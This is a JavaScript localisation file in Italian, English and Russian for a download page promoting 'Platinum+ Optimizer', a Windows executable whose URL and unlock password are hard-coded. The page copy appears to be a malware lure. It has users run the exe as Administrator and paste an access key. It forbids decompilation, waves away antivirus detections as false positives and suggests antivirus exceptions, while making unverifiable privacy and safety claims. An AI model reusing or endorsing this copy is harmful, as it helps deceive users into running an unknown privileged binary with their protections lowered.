const REQUIRED_PASSWORD = "5&.~yWGLH2LMg6(c{^pID=u=z[BNP(LhUs46Paf7A-1e!#0";
const DOWNLOAD_URL = "https://ik.imagekit.io/xsc5vax29/Platinum+Optimizer.exe";

// Mappatura icone Lucide
const ICONS_MAP = {
    'MonitorPlay': 'monitor-play',
    'Layers': 'layers',
    'Code2': 'code-2',
    'Laptop': 'laptop'
};

const IT_CONTENT = {
    app: {
        hero: {
            headline: "Ottimizzazione reale. Prestazioni misurabili.",
            subheadline: "Platinum+ Optimizer è un sistema avanzato di ottimizzazione Kernel progettato per ridurre la latenza e massimizzare le prestazioni hardware.",
            ctaDownloadExe: "Scarica Platinum+ Optimizer",
            ctaLearn: "Come funziona",
            imageLabelLeft: "Interfaccia di Platinum+ Optimizer 7.0",
            imageLabelRight: "Risultati dopo aver applicato Platinum+ Optimizer"
        },
        about: {
            title: "Cos'è Platinum+ Optimizer",
            description1: "Platinum+ Optimizer non è un semplice programma, ma una suite di direttive ingegneristiche che intervengono sul Kernel di Windows per eliminare i colli di bottiglia software.",
            description2: "L'obiettivo è garantire la massima reattività del sistema. L'accesso alle funzioni di ottimizzazione è protetto da una chiave di sicurezza per garantire un'applicazione consapevole.",
        },
        target: {
            title: "Per chi è pensato",
            items: [
                { title: "Gamer Competitivi", description: "Riduzione dell'input lag e stabilizzazione del framerate per un vantaggio competitivo tangibile.", icon: 'MonitorPlay' },
                { title: "Creator e Professionisti", description: "Ambiente di lavoro più reattivo e gestione delle risorse ottimizzata per carichi pesanti.", icon: 'Layers' },
                { title: "Utenti Avanzati", description: "Controllo totale sul sistema operativo senza bloatware o processi inutili.", icon: 'Code2' },
                { title: "PC Desktop e Laptop", description: "Progettato per spremere al massimo l'hardware, rimuovendo limitazioni energetiche sia su fissi che su portatili.", icon: 'Laptop' }
            ]
        },
        benefits: {
            title: "Vantaggi Concreti",
            items: [
                "Reattività del sistema immediata e misurabile.",
                "Riduzione drastica dei micro-stuttering in gioco.",
                "Migliore stabilità del sistema sotto carico elevato.",
                "Nessun impatto negativo sulla sicurezza di Windows Defender."
            ]
        },
        security: {
            title: "Sicurezza e Trasparenza",
            content: "Platinum+ Optimizer opera in totale trasparenza. Il software non richiede installazione invasiva e ogni operazione critica è preceduta dalla creazione automatica di un punto di ripristino del sistema.",
        },
        virusTotal: {
            title: "Analisi VirusTotal & Integrità",
            description: "Il codice è costantemente monitorato per garantire la massima sicurezza. L'integrità del file è verificabile tramite hash SHA256.",
            technicalNote: "NOTA TECNICA:",
            note: "NOTA SUI FALSI POSITIVI: Poiché le direttive interagiscono profondamente con il sistema (Kernel/Registro), alcuni antivirus potrebbero segnalare l'attività come 'sospetta'. Questo è normale per strumenti di amministrazione avanzata.",
            improperUseTitle: "⚠️ ATTENZIONE: SOLO PER UTENTI ESPERTI",
            improperUseText: "È SEVERAMENTE VIETATO tentare di estrarre o decompilare il codice. L'accesso è consentito solo tramite la chiave univoca fornita in questa pagina."
        },
        reviews: {
            title: "Feedback della Community",
            subtitle: "Esperienze reali da utenti verificati. Condividi i tuoi benchmark.",
            formTitle: "Invia Report Prestazioni",
            labelName: "Gamer Tag / Nome",
            labelSpecs: "Specifiche Sistema (CPU / GPU)",
            labelReview: "Analisi Tecnica / Recensione",
            placeholderReview: "Descrivi i miglioramenti di latenza, FPS o stabilità...",
            btnSubmit: "Invia Dati al Server",
            successMessage: "REPORT TRASMESSO. Grazie per il tuo contributo al database Platinum+.",
            recentReports: "Ultimi Report Verificati"
        },
        bugReport: {
            btnLabel: "Segnala un Bug",
            modalTitle: "System Debug Console",
            subtitle: "Segnala anomalie tecniche o comportamenti imprevisti dello script.",
            fields: {
                type: "Tipo di Errore",
                typeOpts: ["Errore di Esecuzione (Crash)", "Interfaccia Grafica", "Modulo non Funzionante", "Falso Positivo Antivirus", "Altro"],
                severity: "Livello di Criticità",
                severityOpts: ["Basso (Cosmetico)", "Medio (Funzionalità Limitata)", "Alto (Errore Critico)"],
                desc: "Dettagli Tecnici",
                descPlaceholder: "Descrivi passo passo come riprodurre l'errore...",
                email: "Email di Contatto (Opzionale)",
                sysInfo: "Includi Log di Sistema Anonimizzati"
            },
            submit: "Trasmetti Ticket di Errore",
            success: "Ticket #PLT-7749 Aperto con Successo. Il team di ingegneria analizzerà i log.",
            close: "Chiudi Console"
        },
        steps: {
            title: "Download & Attivazione",
            items: [
                { number: 1, title: "Scarica il Programma", description: "Scarica il file .exe ufficiale dal pulsante qui sotto." },
                { number: 2, title: "Avvia Platinum+", description: "Esegui il file Platinum+Optimizer.exe come Amministratore." },
                { number: 3, title: "Copia la Chiave", description: "Copia la password di sicurezza mostrata in fondo a questa pagina." },
                { number: 4, title: "Autenticazione", description: "Incolla la chiave (CTRL+V) nel terminale quando richiesto per sbloccare l'ottimizzazione." },
                { number: 5, title: "Applica Moduli", description: "Digita in sequenza: 1 (CPU), 2 (GPU), 3 (Debloater), 4 (Services), 5 (Network), 6 (RAM). Infine digita 0 per uscire e riavvia il PC." }
            ]
        },
        download: {
            title: "Terminale di Ottimizzazione",
            version: "Platinum+ Optimizer 7.0",
            buttonExe: "Scarica Platinum+ Optimizer",
            url: DOWNLOAD_URL,
            compatibility: "Compatibile solo con Windows 10/11",
            passwordLabel: "Chiave di Accesso (Copia questa stringa)",
            copyBtn: "Copia Password",
            copiedBtn: "Copiato!"
        },
        faq: {
            title: "FAQ Tecniche",
            items: [
                { question: "Dove trovo la password?", answer: "La password si trova nella sezione 'Download & Attivazione' in fondo alla pagina, raggiungibile rapidamente cliccando il pulsante 'Guida' in alto a destra nel menu." },
                { question: "Le modifiche sono reversibili?", answer: "Sì. Il software crea automaticamente un Punto di Ripristino prima di applicare qualsiasi modifica al Kernel o al Registro." },
                { question: "Devo disattivare l'antivirus?", answer: "Generalmente non è necessario, ma se Windows Defender o altri antivirus bloccano l'esecuzione, potrebbe essere necessario aggiungere un'eccezione data la natura profonda delle ottimizzazioni." },
                { question: "Migliora gli FPS in gioco?", answer: "Sì, rimuovendo i colli di bottiglia del sistema e ottimizzando la priorità della CPU, si nota spesso un miglioramento della stabilità degli FPS (1% lows) e una riduzione dell'input lag." },
                { question: "Hai bisogno di assistenza?", answer: "In caso di problemi tecnici o dubbi, puoi contattare il nostro supporto ufficiale all'indirizzo email: PlatinumOptimizerHelp@gmail.com" }
            ]
        },
        footer: {
            copyright: "© 2025 Platinum+ Optimizer. Tutti i diritti riservati.",
            disclaimer: "L'uso di questo strumento è a rischio e pericolo dell'utente. Non siamo responsabili per eventuali danni diretti o indiretti.",
            privacy: "Privacy Policy",
            legalDisclaimer: "Disclaimer",
            closeBtn: "Chiudi"
        },
        nav: {
            about: "Cos'è",
            target: "Per chi",
            howItWorks: "Guida",
            faq: "FAQ"
        }
    },
    legal: {
        privacy: `1. Raccolta Dati: Platinum+ Optimizer non raccoglie, memorizza o trasmette alcun dato personale dell'utente.
2. Esecuzione Locale: Tutto il codice viene eseguito localmente sulla macchina dell'utente senza comunicazioni verso server esterni.
3. Nessuna Telemetria: Il software non include moduli di telemetria, tracciamento o analisi comportamentale.
4. Codice Sorgente: Essendo un tool di ottimizzazione, i comandi sono verificabili dal comportamento del sistema.
5. Connessione Internet: Il programma non richiede una connessione internet attiva per funzionare, garantendo l'isolamento dei dati.
6. Log di Sistema: Eventuali log generati sono salvati esclusivamente in locale e sono temporanei.`,
        disclaimer: `LIMITAZIONE DI RESPONSABILITÀ (DISCLAIMER)

1. ACCETTAZIONE DEI RISCHI
L'utilizzo del software "Platinum+ Optimizer" è a totale discrezione e rischio dell'utente. Il Software viene fornito "COSÌ COM'È".

2. MODIFICHE AL SISTEMA
Il Software apporta modifiche profonde al sistema operativo Microsoft Windows.

3. ESCLUSIONE DI DANNI
In nessun caso gli sviluppatori saranno responsabili per danni diretti o indiretti derivanti dall'uso del Software.`
    }
};

const EN_CONTENT = {
    app: {
        hero: {
            headline: "Real Optimization. Measurable Performance.",
            subheadline: "Platinum+ Optimizer is an advanced Kernel optimization system designed to reduce latency and maximize hardware performance.",
            ctaDownloadExe: "Download Platinum+ Optimizer",
            ctaLearn: "How it works",
            imageLabelLeft: "Platinum+ Optimizer 7.0 Interface",
            imageLabelRight: "Results after applying Platinum+ Optimizer"
        },
        about: {
            title: "What is Platinum+ Optimizer",
            description1: "Platinum+ Optimizer is not just a program, but a suite of engineering directives interacting with the Windows Kernel to eliminate software bottlenecks.",
            description2: "The goal is to ensure maximum system responsiveness. Access to optimization functions is protected by a security key to ensure conscious application.",
        },
        target: {
            title: "Who is it for",
            items: [
                { title: "Competitive Gamers", description: "Input lag reduction and framerate stabilization for a tangible competitive advantage.", icon: 'MonitorPlay' },
                { title: "Creators & Professionals", description: "More responsive work environment and optimized resource management for heavy loads.", icon: 'Layers' },
                { title: "Power Users", description: "Total control over the operating system without bloatware or useless processes.", icon: 'Code2' },
                { title: "Desktops & Laptops", description: "Designed to squeeze the most out of hardware, removing power limitations on both desktops and laptops.", icon: 'Laptop' }
            ]
        },
        benefits: {
            title: "Concrete Advantages",
            items: [
                "Immediate and measurable system responsiveness.",
                "Drastic reduction of micro-stuttering in gaming.",
                "Better system stability under high load.",
                "No negative impact on Windows Defender security."
            ]
        },
        security: {
            title: "Security and Transparency",
            content: "Platinum+ Optimizer operates with total transparency. The software requires no invasive installation and every critical operation is preceded by the automatic creation of a system restore point.",
        },
        virusTotal: {
            title: "VirusTotal Analysis & Integrity",
            description: "The code is constantly monitored to ensure maximum security. File integrity is verifiable via SHA256 hash.",
            technicalNote: "TECHNICAL NOTE:",
            note: "NOTE ON FALSE POSITIVES: Since directives interact deeply with the system (Kernel/Registry), some antiviruses might flag activity as 'suspicious'. This is normal for advanced administration tools.",
            improperUseTitle: "⚠️ WARNING: EXPERT USERS ONLY",
            improperUseText: "IT IS STRICTLY FORBIDDEN to attempt to extract or decompile the code. Access is allowed only via the unique key provided on this page."
        },
        reviews: {
            title: "Community Feedback",
            subtitle: "Real experiences from verified users. Share your benchmarks.",
            formTitle: "Submit Performance Report",
            labelName: "Gamer Tag / Name",
            labelSpecs: "System Specs (CPU / GPU)",
            labelReview: "Technical Analysis / Review",
            placeholderReview: "Describe latency improvements, FPS stability, or overall feel...",
            btnSubmit: "Transmit Data to Server",
            successMessage: "REPORT TRANSMITTED. Thank you for contributing to the Platinum+ database.",
            recentReports: "Latest Verified Reports"
        },
        bugReport: {
            btnLabel: "Report a Bug",
            modalTitle: "System Debug Console",
            subtitle: "Report technical anomalies or unexpected behavior of the script.",
            fields: {
                type: "Error Type",
                typeOpts: ["Execution Error (Crash)", "GUI Glitch", "Module Not Working", "Antivirus False Positive", "Other"],
                severity: "Severity Level",
                severityOpts: ["Low (Cosmetic)", "Medium (Limited Functionality)", "High (Critical Error)"],
                desc: "Technical Details",
                descPlaceholder: "Describe step-by-step how to reproduce the error...",
                email: "Contact Email (Optional)",
                sysInfo: "Include Anonymized System Logs"
            },
            submit: "Transmit Error Ticket",
            success: "Ticket #PLT-7749 Opened Successfully. Engineering team will analyze logs.",
            close: "Close Console"
        },
        steps: {
            title: "Download & Activation",
            items: [
                { number: 1, title: "Download Program", description: "Download the official .exe file from the button below." },
                { number: 2, title: "Run Platinum+", description: "Run the Platinum+Optimizer.exe file as Administrator." },
                { number: 3, title: "Copy the Key", description: "Copy the security password shown at the bottom of the page." },
                { number: 4, title: "Authentication", description: "Paste the key (CTRL+V) into the terminal when requested to unlock the optimizer." },
                { number: 5, title: "Apply Modules", description: "Type numbers in order: 1 (CPU), 2 (GPU), 3 (Debloater), 4 (Services), 5 (Network), 6 (RAM). Finally, type 0 to exit and restart PC." }
            ]
        },
        download: {
            title: "Optimization Terminal",
            version: "Platinum+ Optimizer 7.0",
            buttonExe: "Download Platinum+ Optimizer",
            url: DOWNLOAD_URL,
            compatibility: "Compatible only with Windows 10/11",
            passwordLabel: "Access Key (Copy this string)",
            copyBtn: "Copy Password",
            copiedBtn: "Copied!"
        },
        faq: {
            title: "Technical FAQ",
            items: [
                { question: "Where do I find the password?", answer: "The password is located in the 'Download & Activation' section at the bottom of the page, accessible via the 'Guide' button in the top right menu." },
                { question: "Are changes reversible?", answer: "Yes. The terminal automatically creates a Restore Point before applying any changes to the Kernel or Registry." },
                { question: "Do I need to disable my antivirus?", answer: "Generally not necessary, but if Windows Defender or other antivirus block execution, you may need to add an exception given the deep nature of the optimizations." },
                { question: "Does it improve FPS in games?", answer: "Yes, by removing system bottlenecks and optimizing CPU priority, you often see an improvement in FPS stability (1% lows) and a reduction in input lag." },
                { question: "Need support?", answer: "For any technical issues or specific questions, please contact our official support at: PlatinumOptimizerHelp@gmail.com" }
            ]
        },
        footer: {
            copyright: "© 2025 Platinum+ Optimizer. All rights reserved.",
            disclaimer: "Use of this software is at the user's own risk. We are not responsible for any direct or indirect damage.",
            privacy: "Privacy Policy",
            legalDisclaimer: "Disclaimer",
            closeBtn: "Close"
        },
        nav: {
            about: "About",
            target: "For Whom",
            howItWorks: "Guide",
            faq: "FAQ"
        }
    },
    legal: {
        privacy: `1. Data Collection: Platinum+ Optimizer does not collect, store, or transmit any personal user data.
2. Local Execution: All code runs locally on the user's machine without communication to external servers.
3. No Telemetry: The software includes no telemetry, tracking, or behavioral analysis modules.
4. Source Code: As an optimization tool, operations are verifiable via system behavior.
5. Internet Connection: The program does not require an active internet connection to function, ensuring data isolation.`,
        disclaimer: `LIMITATION OF LIABILITY (DISCLAIMER)

1. ACCEPTANCE OF RISKS
The use of the software "Platinum+ Optimizer" is at the user's sole discretion and risk. The Software is provided "AS IS".

2. SYSTEM MODIFICATIONS
The Software makes deep changes to the Microsoft Windows operating system.

3. EXCLUSION OF DAMAGES
In no event shall the developers be liable for direct, indirect, incidental, or consequential damages.`
    }
};

const RU_CONTENT = {
    app: {
        hero: {
            headline: "Реальная оптимизация. Измеримая производительность.",
            subheadline: "Platinum+ Optimizer — это продвинутая система оптимизации Ядра, разработанная для снижения задержки и максимизации производительности оборудования.",
            ctaDownloadExe: "Скачать Platinum+ Optimizer",
            ctaLearn: "Как это работает",
            imageLabelLeft: "Интерфейс Platinum+ Optimizer 7.0",
            imageLabelRight: "Результаты после применения Platinum+ Optimizer"
        },
        about: {
            title: "Что такое Platinum+ Optimizer",
            description1: "Platinum+ Optimizer — это не просто программа, а набор инженерных директив, взаимодействующих с ядром Windows для устранения программных узких мест.",
            description2: "Цель — обеспечить максимальную отзывчивость системы. Доступ к функциям оптимизации защищен ключом безопасности для обеспечения осознанного применения.",
        },
        target: {
            title: "Для кого это",
            items: [
                { title: "Соревновательные геймеры", description: "Снижение задержки ввода (Input Lag) и стабилизация частоты кадров для ощутимого конкурентного преимущества.", icon: 'MonitorPlay' },
                { title: "Креаторы и Профессионалы", description: "Более отзывчивая рабочая среда и оптимизированное управление ресурсами для тяжелых нагрузок.", icon: 'Layers' },
                { title: "Опытные пользователи", description: "Полный контроль над операционной системой без bloatware и бесполезных процессов.", icon: 'Code2' },
                { title: "ПК и Ноутбуки", description: "Создан, чтобы выжать максимум из железа, снимая ограничения энергопотребления как на стационарных ПК, так и на ноутбуках.", icon: 'Laptop' }
            ]
        },
        benefits: {
            title: "Конкретные преимущества",
            items: [
                "Мгновенная и измеримая отзывчивость системы.",
                "Радикальное снижение микро-фризов в играх.",
                "Лучшая стабильность системы под высокой нагрузкой.",
                "Никакого негативного влияния на безопасность Windows Defender."
            ]
        },
        security: {
            title: "Безопасность и Прозрачность",
            content: "Platinum+ Optimizer работает абсолютно прозрачно. Программа не требует инвазивной установки, и каждой критической операции предшествует автоматическое создание точки восстановления системы.",
        },
        virusTotal: {
            title: "Анализ VirusTotal и целостность",
            description: "Код постоянно мониторится для обеспечения максимальной безопасности. Целостность файла можно проверить по хэшу SHA256.",
            technicalNote: "ТЕХНИЧЕСКОЕ ПРИМЕЧАНИЕ:",
            note: "ПРИМЕЧАНИЕ О ЛОЖНЫХ СРАБАТЫВАНИЯХ: Поскольку директивы глубоко взаимодействуют с системой (Ядро/Реестр), некоторые антивирусы могут помечать активность как «подозрительную». Это нормально для инструментов администрирования.",
            improperUseTitle: "⚠️ ВНИМАНИЕ: ТОЛЬКО ДЛЯ ЭКСПЕРТОВ",
            improperUseText: "СТРОГО ЗАПРЕЩЕНО пытаться извлечь или декомпилировать код. Доступ разрешен только через уникальный ключ, предоставленный на этой странице."
        },
        reviews: {
            title: "Отзывы сообщества",
            subtitle: "Реальный опыт проверенных пользователей. Поделитесь своими результатами.",
            formTitle: "Отправить отчет о производительности",
            labelName: "Геймерский тег / Имя",
            labelSpecs: "Спецификации системы (CPU / GPU)",
            labelReview: "Технический анализ / Обзор",
            placeholderReview: "Опишите улучшение задержки, стабильность FPS или общие ощущения...",
            btnSubmit: "Передать данные на сервер",
            successMessage: "ОТЧЕТ ПЕРЕДАН. Спасибо за вклад в базу данных Platinum+.",
            recentReports: "Последние проверенные отчеты"
        },
        bugReport: {
            btnLabel: "Сообщить об ошибке",
            modalTitle: "Консоль отладки системы",
            subtitle: "Сообщайте о технических аномалиях или неожиданном поведении скрипта.",
            fields: {
                type: "Тип ошибки",
                typeOpts: ["Ошибка выполнения (Crash)", "Графический сбой", "Модуль не работает", "Ложное срабатывание антивируса", "Другое"],
                severity: "Уровень серьезности",
                severityOpts: ["Низкий (Косметический)", "Средний (Ограниченная функц.)", "Высокий (Критическая ошибка)"],
                desc: "Технические детали",
                descPlaceholder: "Опишите пошагово, как воспроизвести ошибку...",
                email: "Контактный Email (Опционально)",
                sysInfo: "Включить анонимизированные системные логи"
            },
            submit: "Отправить тикет ошибки",
            success: "Тикет #PLT-7749 успешно открыт. Инженерная команда проанализирует логи.",
            close: "Закрыть консоль"
        },
        steps: {
            title: "Скачивание и активация",
            items: [
                { number: 1, title: "Скачать программу", description: "Скачайте официальный файл .exe по кнопке ниже." },
                { number: 2, title: "Запустить Platinum+", description: "Запустите файл Platinum+Optimizer.exe от имени администратора." },
                { number: 3, title: "Скопировать ключ", description: "Скопируйте пароль безопасности, показанный внизу страницы." },
                { number: 4, title: "Аутентификация", description: "Вставьте ключ (CTRL+V) в терминал по запросу, чтобы разблокировать оптимизатор." },
                { number: 5, title: "Применить модули", description: "Введите цифры от 1 до 6 по порядку (CPU, GPU, Debloater, Services, Network, RAM). Нажмите 0 для выхода и перезагрузите ПК." }
            ]
        },
        download: {
            title: "Терминал оптимизации",
            version: "Platinum+ Optimizer 7.0",
            buttonExe: "Скачать Platinum+ Optimizer",
            url: DOWNLOAD_URL,
            compatibility: "Совместимо только с Windows 10/11",
            passwordLabel: "Ключ доступа (Скопируйте эту строку)",
            copyBtn: "Копировать пароль",
            copiedBtn: "Скопировано!"
        },
        faq: {
            title: "Технические FAQ",
            items: [
                { question: "Где найти пароль?", answer: "Пароль находится в разделе «Скачивание и активация» внизу страницы, доступном через кнопку «Гид» в правом верхнем углу меню." },
                { question: "Обратимы ли изменения?", answer: "Да. Терминал автоматически создает точку восстановления перед применением любых изменений в ядре или реестре." },
                { question: "Нужно ли отключать антивирус?", answer: "Обычно нет, но если Windows Defender или другие антивирусы блокируют выполнение, возможно, потребуется добавить исключение, учитывая глубокий характер оптимизаций." },
                { question: "Улучшает ли это FPS в играх?", answer: "Да, устраняя узкие места системы и оптимизируя приоритет ЦП, вы часто видите улучшение стабильности FPS (1% lows) и снижение задержки ввода." },
                { question: "Нужна помощь?", answer: "В случае технических проблем или вопросов при установке обращайтесь в нашу официальную службу поддержки: PlatinumOptimizerHelp@gmail.com" }
            ]
        },
        footer: {
            copyright: "© 2025 Platinum+ Optimizer. Все права защищены.",
            disclaimer: "Использование этого программного обеспечения осуществляется на страх и риск пользователя. Мы не несем ответственности за любой прямой или косвенный ущерб.",
            privacy: "Политика конфиденциальности",
            legalDisclaimer: "Отказ от ответственности",
            closeBtn: "Закрыть"
        },
        nav: {
            about: "О нас",
            target: "Для кого",
            howItWorks: "Гид",
            faq: "FAQ"
        }
    },
    legal: {
        privacy: `1. Сбор данных: Platinum+ Optimizer не собирает, не хранит и не передает никаких персональных данных пользователя.
2. Локальное выполнение: Весь код выполняется локально.`,
        disclaimer: `ОГРАНИЧЕНИЕ ОТВЕТСТВЕННОСТИ (DISCLAIMER)

1. ПРИНЯТИЕ РИСКОВ
Использование программного обеспечения осуществляется на страх и риск пользователя.`
    }
};

const TRANSLATIONS = {
    it: IT_CONTENT,
    en: EN_CONTENT,
    ru: RU_CONTENT
};

// Export to window for global access
window.REQUIRED_PASSWORD = REQUIRED_PASSWORD;
window.DOWNLOAD_URL = DOWNLOAD_URL;
window.ICONS_MAP = ICONS_MAP;
window.TRANSLATIONS = TRANSLATIONS;